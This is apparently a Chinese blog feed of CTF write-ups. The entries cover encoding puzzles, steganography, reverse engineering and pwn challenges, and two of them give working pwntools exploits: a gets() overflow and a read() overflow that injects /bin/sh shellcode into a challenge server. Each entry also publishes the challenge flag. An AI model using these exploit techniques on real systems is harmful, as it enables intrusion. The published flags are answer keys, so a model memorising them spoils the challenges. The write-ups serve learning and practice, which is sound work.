        <content type="html"><![CDATA[<html><head></head><body><h3 id="GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI"><a href="#GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI" class="headerlink" title="GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI==="></a>GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===</h3><h1 id="由题目提示，且多次遇到Base64的经验告诉我，这个长得确实不像Base64，Base64一般都有小写的，而这个却都是大写。"><a href="#由题目提示，且多次遇到Base64的经验告诉我，这个长得确实不像Base64，Base64一般都有小写的，而这个却都是大写。" class="headerlink" title="由题目提示，且多次遇到Base64的经验告诉我，这个长得确实不像Base64，Base64一般都有小写的，而这个却都是大写。"></a>由题目提示，且多次遇到Base64的经验告诉我，这个长得确实不像Base64，Base64一般都有小写的，而这个却都是大写。</h1><h1 id="Base64和Base32加密中，遇到位数不足都会使用等于号代替，于是我猜测可能是Base32。"><a href="#Base64和Base32加密中，遇到位数不足都会使用等于号代替，于是我猜测可能是Base32。" class="headerlink" title="Base64和Base32加密中，遇到位数不足都会使用等于号代替，于是我猜测可能是Base32。"></a>Base64和Base32加密中，遇到位数不足都会使用等于号代替，于是我猜测可能是Base32。</h1><h1 id="打开在线Base32解密的网站，进行解密"><a href="#打开在线Base32解密的网站，进行解密" class="headerlink" title="打开在线Base32解密的网站，进行解密"></a>打开在线Base32解密的网站，进行解密</h1><p><a href="/2018/12/08/CTF-JarvisOJ-Basic-Base64/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-JarvisOJ-Basic-Base64/1.png" class="lazyload"></a></p><h1 id="这是一串十六进制的数字，这时候就是考验经验的时候了，其实这个是字符串的十六进制形式"><a href="#这是一串十六进制的数字，这时候就是考验经验的时候了，其实这个是字符串的十六进制形式" class="headerlink" title="这是一串十六进制的数字，这时候就是考验经验的时候了，其实这个是字符串的十六进制形式"></a>这是一串十六进制的数字，这时候就是考验经验的时候了，其实这个是字符串的十六进制形式</h1><h1 id="你可以选择使用在线将hex转为字符串，我选择复习一下python"><a href="#你可以选择使用在线将hex转为字符串，我选择复习一下python" class="headerlink" title="你可以选择使用在线将hex转为字符串，我选择复习一下python"></a>你可以选择使用在线将hex转为字符串，我选择复习一下python</h1><p><a href="/2018/12/08/CTF-JarvisOJ-Basic-Base64/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-JarvisOJ-Basic-Base64/2.png" class="lazyload"></a></p><h3 id="PCTF-Just-t3st-h4v3-f4n"><a href="#PCTF-Just-t3st-h4v3-f4n" class="headerlink" title="PCTF{Just_t3st_h4v3_f4n}"></a>PCTF{Just_t3st_h4v3_f4n}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Nuptzj-Pwn-WhenDidYouBorn</title>
      <link href="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/"/>
      <url>/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="这是一道南京邮电大学CTF平台的题目"><a href="#这是一道南京邮电大学CTF平台的题目" class="headerlink" title="这是一道南京邮电大学CTF平台的题目"></a>这是一道南京邮电大学CTF平台的题目</h2><h2 id="由于它的服务器已经挂了，远程连接不了主机"><a href="#由于它的服务器已经挂了，远程连接不了主机" class="headerlink" title="由于它的服务器已经挂了，远程连接不了主机"></a>由于它的服务器已经挂了，远程连接不了主机</h2><h2 id="我们就使用本地调试，本地创建一个flag文件"><a href="#我们就使用本地调试，本地创建一个flag文件" class="headerlink" title="我们就使用本地调试，本地创建一个flag文件"></a>我们就使用本地调试，本地创建一个flag文件</h2><h2 id="flag内容为"><a href="#flag内容为" class="headerlink" title="flag内容为"></a>flag内容为</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAKE{You get Flag}</span><br></pre></td></tr></tbody></table></figure></div><p>文件下载<a href="nuptzj-WhenDidYouBorn.rar">nuptzj-WhenDidYouBorn.rar</a></p><h1 id="nuptzj-WhenDidYouBorn-rar中包含了源码和程序，但是我不看源码，直接将程序丢到ida大妈手里了"><a href="#nuptzj-WhenDidYouBorn-rar中包含了源码和程序，但是我不看源码，直接将程序丢到ida大妈手里了" class="headerlink" title="nuptzj-WhenDidYouBorn.rar中包含了源码和程序，但是我不看源码，直接将程序丢到ida大妈手里了"></a>nuptzj-WhenDidYouBorn.rar中包含了源码和程序，但是我不看源码，直接将程序丢到ida大妈手里了</h1><p><a href="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/1.png" class="lazyload"></a></p><h1 id="很明显存在gets漏洞，我们可以输入超出v4-name-8-的长度，然后把v5顶掉"><a href="#很明显存在gets漏洞，我们可以输入超出v4-name-8-的长度，然后把v5顶掉" class="headerlink" title="很明显存在gets漏洞，我们可以输入超出v4(name[8])的长度，然后把v5顶掉"></a>很明显存在gets漏洞，我们可以输入超出v4(name[8])的长度，然后把v5顶掉</h1><p><a href="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/2.png" class="lazyload"></a></p><h1 id="因为var-20-v4-低于var-18-v5"><a href="#因为var-20-v4-低于var-18-v5" class="headerlink" title="因为var_20(v4)低于var_18(v5)"></a>因为var_20(v4)低于var_18(v5)</h1><h1 id="所以当var-20-v4-溢出时，溢出的数据将会覆盖到var-18-v5"><a href="#所以当var-20-v4-溢出时，溢出的数据将会覆盖到var-18-v5" class="headerlink" title="所以当var_20(v4)溢出时，溢出的数据将会覆盖到var_18(v5)"></a>所以当var_20(v4)溢出时，溢出的数据将会覆盖到var_18(v5)</h1><h2 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h2><h1 id="将输入一个非1926的数值，跳过第一个if"><a href="#将输入一个非1926的数值，跳过第一个if" class="headerlink" title="将输入一个非1926的数值，跳过第一个if"></a>将输入一个非1926的数值，跳过第一个if</h1><h1 id="再输入payload，将v5顶替为1926，使得第二个if结果为真，获得flag"><a href="#再输入payload，将v5顶替为1926，使得第二个if结果为真，获得flag" class="headerlink" title="再输入payload，将v5顶替为1926，使得第二个if结果为真，获得flag"></a>再输入payload，将v5顶替为1926，使得第二个if结果为真，获得flag</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./test")</span><br><span class="line">#sh = remote("115.28.79.166",5555)</span><br><span class="line">sh.send("1999\n")</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">junk = "a" * 8</span><br><span class="line">leak  = p64(1926)</span><br><span class="line">payload = junk + leak + '\n'</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-Nuptzj-Pwn-WhenDidYouBorn/3.png" class="lazyload"></a></p><h2 id="Flag为你自己设定的文本"><a href="#Flag为你自己设定的文本" class="headerlink" title="Flag为你自己设定的文本"></a>Flag为你自己设定的文本</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Re-[DD-Hello]</title>
      <link href="/2018/12/08/CTF-JarvisOJ-Re-%5BDD-Hello%5D/"/>
      <url>/2018/12/08/CTF-JarvisOJ-Re-%5BDD-Hello%5D/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Flag-是下一关的邮箱地址（以-DD-开头）。"><a href="#Flag-是下一关的邮箱地址（以-DD-开头）。" class="headerlink" title="Flag 是下一关的邮箱地址（以 DD 开头）。"></a>Flag 是下一关的邮箱地址（以 DD 开头）。</h1><p>文件下载<a href="hello">hello</a></p><h1 id="将文件导入ida，如下图"><a href="#将文件导入ida，如下图" class="headerlink" title="将文件导入ida，如下图"></a>将文件导入ida，如下图</h1><p><a href="/2018/12/08/CTF-JarvisOJ-Re-[DD-Hello]/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-JarvisOJ-Re-[DD-Hello]/1.png" class="lazyload"></a></p><h1 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><figcaption><span>``` </span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">函数，也没有发现什么特别的FLAG数据</span><br><span class="line"># 所以FLAG可能存在别的函数中</span><br><span class="line"># 经过一番查看，在sub_100000CE0()中找到关键代码</span><br></pre></td></tr></tbody></table></figure></div><p>int sub_100000CE0()<br>{<br>  int result; // eax<br>  signed int v1; // [rsp+1Ch] [rbp-14h]<br>  int v2; // [rsp+24h] [rbp-Ch]</p><p>  v2 = ((unsigned __int64)((char *)start - (char *)sub_100000C90) >> 2) ^ byte_100001040[0];<br>  result = sub_100000DE0();<br>  if ( !(result & 1) )<br>  {<br>    v1 = 0;<br>    while ( v1 < 55 )<br>    {<br>      byte_100001040[v1] -= 2;<br>      byte_100001040[v1] ^= v2;<br>      ++v1;<br>      ++v2;<br>    }<br>    result = printf(“\nFinal output is %s\n”, &byte_100001040[1]);<br>  }<br>  return result;<br>}</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 其实输出的就是FLAG了</span><br><span class="line"># 下面按照它这个格式通过python写代码</span><br><span class="line"># (char *)start 和 (char *)sub_100000C90就是地址，所以我们要取出地址是多少</span><br><span class="line"># (char *)start                  =     100000CB0</span><br><span class="line"># (char *)sub_100000C90  =    100000C90</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># byte_100001040是一个字符串，在内存中找到它</span><br><span class="line">![](2.png)</span><br><span class="line"></span><br><span class="line"># byte_100001040 = 411011111B0A64676A6862686E67686B623D656A6A3D6804050803020255085D61550A5F0D5D6132171D191F1820040212161E542013140000</span><br></pre></td></tr></tbody></table></figure></div><p>s = “\x41\x10\x11\x11\x1B\x0A\x64\x67\x6A\x68\x62\x68\x6E\x67\x68\x6B\x62\x3D\x65\x6A\x6A\x3D\x68\x04\x05\x08\x03\x02\x02\x55\x08\x5D\x61\x55\x0A\x5F\x0D\x5D\x61\x32\x17\x1D\x19\x1F\x18\x20\x04\x02\x12\x16\x1E\x54\x20\x13\x14\x00\x00”<br>v2 = ((0x100000CB0 - 0x100000C90)>>2) ^ 0x41<br>for i in range(0,55):<br>    print chr((ord(s[i])-2)^ v2)<br>    v2+=1</p><p>```<br><a href="/2018/12/08/CTF-JarvisOJ-Re-[DD-Hello]/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/08/CTF-JarvisOJ-Re-[DD-Hello]/3.png" class="lazyload"></a></p><h1 id="由于要去除第一位，所以FLAG为下面这个字符串"><a href="#由于要去除第一位，所以FLAG为下面这个字符串" class="headerlink" title="由于要去除第一位，所以FLAG为下面这个字符串"></a>由于要去除第一位，所以FLAG为下面这个字符串</h1><h1 id="DDCTF-5943293119a845e9bbdbde5a369c1f50-didichuxing-com"><a href="#DDCTF-5943293119a845e9bbdbde5a369c1f50-didichuxing-com" class="headerlink" title="DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com"></a><a href="mailto:DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com">DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com</a></h1></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-美丽的实验室logo</title>
      <link href="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/"/>
      <url>/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="出题人丢下个logo就走了，大家自己看着办吧"><a href="#出题人丢下个logo就走了，大家自己看着办吧" class="headerlink" title="出题人丢下个logo就走了，大家自己看着办吧"></a>出题人丢下个logo就走了，大家自己看着办吧</h2><h2 id="文件下载logo-jpg-8244d3d060e9806accc508ec689fabfb"><a href="#文件下载logo-jpg-8244d3d060e9806accc508ec689fabfb" class="headerlink" title="文件下载logo.jpg.8244d3d060e9806accc508ec689fabfb"></a>文件下载<a href="logo.jpg.8244d3d060e9806accc508ec689fabfb">logo.jpg.8244d3d060e9806accc508ec689fabfb</a></h2><h1 id="这道题考察隐写术"><a href="#这道题考察隐写术" class="headerlink" title="这道题考察隐写术"></a>这道题考察隐写术</h1><h1 id="需要用到Stegsolve-jar，这个软件我会提供大家下载"><a href="#需要用到Stegsolve-jar，这个软件我会提供大家下载" class="headerlink" title="需要用到Stegsolve.jar，这个软件我会提供大家下载"></a>需要用到Stegsolve.jar，这个软件我会提供大家下载</h1><p>文件下载<a href="Stegsolve.jar">Stegsolve.jar</a></p><h1 id="先导入图片"><a href="#先导入图片" class="headerlink" title="先导入图片"></a>先导入图片</h1><p><a href="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/1.png" class="lazyload"></a></p><h1 id="点击上方的Analyse，里面有一个Frame-Browser"><a href="#点击上方的Analyse，里面有一个Frame-Browser" class="headerlink" title="点击上方的Analyse，里面有一个Frame Browser"></a>点击上方的Analyse，里面有一个Frame Browser</h1><p><a href="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/2.png" class="lazyload"></a></p><p>#点击后，按中下方的 ‘>’就会有flag了<br><a href="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/07/CTF-JarvisOJ-Basic-%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%AE%9E%E9%AA%8C%E5%AE%A4logo/3.png" class="lazyload"></a></p><h3 id="PCTF-You-are-R3ally-Car3ful"><a href="#PCTF-You-are-R3ally-Car3ful" class="headerlink" title="PCTF{You_are_R3ally_Car3ful}"></a>PCTF{You_are_R3ally_Car3ful}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
            <tag> 隐写术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-ROPGadget</title>
      <link href="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/"/>
      <url>/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="都说学好汇编是学习PWN的基础，以下有一段ROPGadget的汇编指令序列，请提交其十六进制机器码-大写，不要有空格"><a href="#都说学好汇编是学习PWN的基础，以下有一段ROPGadget的汇编指令序列，请提交其十六进制机器码-大写，不要有空格" class="headerlink" title="都说学好汇编是学习PWN的基础，以下有一段ROPGadget的汇编指令序列，请提交其十六进制机器码(大写，不要有空格)"></a>都说学好汇编是学习PWN的基础，以下有一段ROPGadget的汇编指令序列，请提交其十六进制机器码(大写，不要有空格)</h3><h3 id="XCHG-EAX-ESP"><a href="#XCHG-EAX-ESP" class="headerlink" title="XCHG EAX,ESP"></a>XCHG EAX,ESP</h3><h3 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h3><h3 id="MOV-ECX-EAX"><a href="#MOV-ECX-EAX" class="headerlink" title="MOV ECX,[EAX]"></a>MOV ECX,[EAX]</h3><h3 id="MOV-EDX-ECX"><a href="#MOV-EDX-ECX" class="headerlink" title="MOV [EDX],ECX"></a>MOV [EDX],ECX</h3><h3 id="POP-EBX"><a href="#POP-EBX" class="headerlink" title="POP EBX"></a>POP EBX</h3><h3 id="RET-1"><a href="#RET-1" class="headerlink" title="RET"></a>RET</h3><h2 id="提交格式：PCTF-你的答案"><a href="#提交格式：PCTF-你的答案" class="headerlink" title="提交格式：PCTF{你的答案}"></a>提交格式：PCTF{你的答案}</h2><h1 id="这里提供汇编和机器码互转的工具汇编码转机器码万能转换工具-rar"><a href="#这里提供汇编和机器码互转的工具汇编码转机器码万能转换工具-rar" class="headerlink" title="这里提供汇编和机器码互转的工具汇编码转机器码万能转换工具.rar"></a>这里提供汇编和机器码互转的工具<a href="汇编码转机器码万能转换工具.rar">汇编码转机器码万能转换工具.rar</a></h1><h1 id="按以下格式进行转化即可"><a href="#按以下格式进行转化即可" class="headerlink" title="按以下格式进行转化即可"></a>按以下格式进行转化即可</h1><p><a href="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/1.png" class="lazyload"></a></p><h1 id="得到FLAG为94C38B08890A5BC3"><a href="#得到FLAG为94C38B08890A5BC3" class="headerlink" title="得到FLAG为94C38B08890A5BC3"></a>得到FLAG为94C38B08890A5BC3</h1><h3 id="PCTF-94C38B08890A5BC3"><a href="#PCTF-94C38B08890A5BC3" class="headerlink" title="PCTF{94C38B08890A5BC3}"></a>PCTF{94C38B08890A5BC3}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
            <tag> Pwn </tag>
            
            <tag> ROPGadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Baisc-[-.-字符串]</title>
      <link href="/2018/12/07/CTF-JarvisOJ-Basic-%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2018/12/07/CTF-JarvisOJ-Basic-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="请选手观察以下密文并转换成flag形式"><a href="#请选手观察以下密文并转换成flag形式" class="headerlink" title="请选手观察以下密文并转换成flag形式"></a>请选手观察以下密文并转换成flag形式</h3><h3 id="–-…-—-—-—–-—-—-…-…-…-…–-—-–…-—-—-…–-—-—-—-—-…-–…-–…-–…-…-…–-…-—-—–"><a href="#–-…-—-—-—–-—-—-…-…-…-…–-—-–…-—-—-…–-—-—-—-—-…-–…-–…-–…-…-…–-…-—-—–" class="headerlink" title="..-. .-.. .- –. ….. ..— ..— —– .—- —.. -.. -…. -…. ….. …– —.. –… -.. .—- -.. .- —-. …– .—- —.. .—- ..— -… –… –… –… -…. …– ….- .—- —–"></a>..-. .-.. .- –. ….. ..— ..— —– .—- —.. -.. -…. -…. ….. …– —.. –… -.. .—- -.. .- —-. …– .—- —.. .—- ..— -… –… –… –… -…. …– ….- .—- —–</h3><h3 id="flag形式为32位大写md5"><a href="#flag形式为32位大写md5" class="headerlink" title="flag形式为32位大写md5"></a>flag形式为32位大写md5</h3><h3 id="题目来源：CFF2016"><a href="#题目来源：CFF2016" class="headerlink" title="题目来源：CFF2016"></a>题目来源：CFF2016</h3><p>简单观察发现这个是摩斯密码<br>简单转化便可以拿到flag<br>给出一个摩斯密码在线解密的地址</p><h2 id="http-www-zhongguosou-com-zonghe-moErSiCodeConverter-aspx"><a href="#http-www-zhongguosou-com-zonghe-moErSiCodeConverter-aspx" class="headerlink" title="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx"></a><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></h2><p><a href="/2018/12/07/CTF-JarvisOJ-Basic-%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/07/CTF-JarvisOJ-Basic-%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" class="lazyload"></a></p><h2 id="得到FLAG522018D665387D1DA931812B77763410"><a href="#得到FLAG522018D665387D1DA931812B77763410" class="headerlink" title="得到FLAG522018D665387D1DA931812B77763410"></a>得到FLAG522018D665387D1DA931812B77763410</h2><h2 id="根据题目要求-FLAG为32位大写MD5，所以FLAG应该为下面的字符"><a href="#根据题目要求-FLAG为32位大写MD5，所以FLAG应该为下面的字符" class="headerlink" title="根据题目要求 FLAG为32位大写MD5，所以FLAG应该为下面的字符"></a>根据题目要求 FLAG为32位大写MD5，所以FLAG应该为下面的字符</h2><h2 id="522018D665387D1DA931812B77763410"><a href="#522018D665387D1DA931812B77763410" class="headerlink" title="522018D665387D1DA931812B77763410"></a>522018D665387D1DA931812B77763410</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Basic </tag>
            
            <tag> 摩斯密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Pwn-[XMAN]level1</title>
      <link href="/2018/11/30/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel1/"/>
      <url>/2018/11/30/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="nc-pwn2-jarvisoj-com-9877"><a href="#nc-pwn2-jarvisoj-com-9877" class="headerlink" title="nc pwn2.jarvisoj.com 9877"></a>nc pwn2.jarvisoj.com 9877</h3><p>文件下载<a href="level1.80eacdcd51aca92af7749d96efad7fb5">level1.80eacdcd51aca92af7749d96efad7fb5</a></p><h2 id="这道题考察Pwn的shellcode的汇编编写和跳转"><a href="#这道题考察Pwn的shellcode的汇编编写和跳转" class="headerlink" title="这道题考察Pwn的shellcode的汇编编写和跳转"></a>这道题考察Pwn的shellcode的汇编编写和跳转</h2><h1 id="如果是第一次接触的话，还是很有难度的。"><a href="#如果是第一次接触的话，还是很有难度的。" class="headerlink" title="如果是第一次接触的话，还是很有难度的。"></a>如果是第一次接触的话，还是很有难度的。</h1><p>先将程序导入IDA<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/1.png" class="lazyload"></a></p><p>进入vulnerable_function函数<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/2.png" class="lazyload"></a></p><h2 id="这是一个典型的read函数漏洞"><a href="#这是一个典型的read函数漏洞" class="headerlink" title="这是一个典型的read函数漏洞"></a>这是一个典型的read函数漏洞</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf("What's this:%p?\n", &buf);   //它还特意输出了字符串的地址，我们要好好利用一下</span><br></pre></td></tr></tbody></table></figure></div><p>buf的长度是0x88，我们可以写入0x100的数据</p><p>接下来我们来写exp</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("pwn2.jarvisoj.com",9877)</span><br><span class="line">#sh = process("./level1.80eacdcd51aca92af7749d96efad7fb5")</span><br><span class="line"></span><br><span class="line">#得到程序本身输出的字符串地址</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">addr = sh.recvuntil("?",drop = True)</span><br><span class="line">print ("We should hack this address:"+addr)</span><br><span class="line"></span><br><span class="line">#计算地址偏移</span><br><span class="line">re_addr = int(addr,16) + 0x88 + 0x8</span><br><span class="line"></span><br><span class="line">#这里是汇编代码转化为二进制的形式，具体代码可以通过python的asm函数来显示</span><br><span class="line">shellcode = "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"</span><br><span class="line"></span><br><span class="line">#组合数据流</span><br><span class="line">data = 'a' * 0x88 + 'a' * 0x4 + p32(re_addr) + shellcode</span><br><span class="line"></span><br><span class="line">sh.send(data)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p>执行python，拿到shell<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/4.png" class="lazyload"></a></p><p>然后输入ls指令输出当前目录的文件<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/5.png" class="lazyload"></a></p><p>cat指令获取flag<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/6.png" class="lazyload"></a></p><h3 id="CTF-82c2aa534a9dede9c3a0045d0fec8617"><a href="#CTF-82c2aa534a9dede9c3a0045d0fec8617" class="headerlink" title="CTF{82c2aa534a9dede9c3a0045d0fec8617}"></a>CTF{82c2aa534a9dede9c3a0045d0fec8617}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
